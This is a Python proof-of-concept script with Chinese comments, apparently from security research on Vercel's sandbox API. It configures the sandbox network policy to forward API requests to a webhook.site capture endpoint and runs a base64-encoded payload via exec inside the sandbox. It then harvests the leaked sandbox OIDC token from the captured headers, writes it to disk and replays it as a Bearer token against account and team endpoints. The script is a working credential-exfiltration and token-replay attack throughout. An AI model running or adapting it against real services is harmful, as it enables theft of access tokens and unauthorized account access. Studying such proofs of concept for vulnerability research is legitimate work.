# 实验G7: webhook.site 捕获 OIDC token -> 本地 Bearer 调 API 验证 aud 校验
import json, base64, pathlib, urllib.request, urllib.error, re, time

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"
WH = "9c7f5951-b5cd-4b74-afeb-f62d92e457db"

def api(method, path, body=None, headers=None, timeout=60, base="https://api.vercel.com"):
    req = urllib.request.Request(f"{base}{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    for k, v in (headers or {}).items():
        req.add_header(k, v)
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:800]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

# 1. 创建沙箱
NAME = "expg7"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom",
                              "allowedDomains": ["httpbin.org", "api.vercel.com", "webhook.site"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

# 2. 设置转发: api.vercel.com/v2/* -> webhook.site
c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/network-policy?teamId={TEAM}",
           {"allow": {"api.vercel.com": [
               {"match": {"path": {"startsWith": "/v2"}},
                "forwardURL": f"https://webhook.site/{WH}"}]}})
print("update:", c, r[:120])

# 3. 清空 webhook 旧请求
api("DELETE", f"/token/{WH}/requests", base="https://webhook.site")

# 4. 沙箱内触发转发(重试 3 次提高成功率)
payload = base64.b64encode(pathlib.Path("exp_g4b.py").read_bytes()).decode()
body = {"command": "python3", "args": ["-c", f"import base64;exec(base64.b64decode('{payload}').decode())"],
        "wait": True, "logs": True, "timeout": 60000}
c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
print("cmd:", c)

# 5. 读取 webhook 捕获
time.sleep(3)
c, r = api("GET", f"/token/{WH}/requests?per_page=5", base="https://webhook.site")
print("\n== webhook captured ==")
try:
    d = json.loads(r)
    items = d.get("data", [])
    print("total:", d.get("total"))
    tok = ""
    for it in items[:5]:
        print("---", it.get("method"), it.get("url"))
        hdrs = it.get("headers", {})
        for k in sorted(hdrs.keys()):
            v = hdrs[k]
            if isinstance(v, list):
                v = v[0] if v else ""
            print(f"   {k}: {str(v)[:150]}")
            if k.lower() == "vercel-sandbox-oidc-token":
                tok = str(v)
    if tok:
        open("_oidc_token.txt", "w").write(tok)
        print("\nTOKEN_LEN:", len(tok))

        # 6. 本地 Bearer 测试
        print("\n== Bearer 测试(本地) ==")
        for path in ["/v2/user", f"/v2/teams/{TEAM}"]:
            c2, r2 = api("GET", path, headers={"Authorization": f"Bearer {tok}"})
            print(f"GET {path} -> {c2} {r2[:400]}")
        c3, r3 = api("GET", "/v2/user")
        print(f"\n对照(正常token) GET /v2/user -> {c3} {r3[:150]}")
    else:
        print("NO OIDC TOKEN captured")
except Exception as e:
    print("webhook parse err:", e, r[:300])

# 7. 清理
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done")
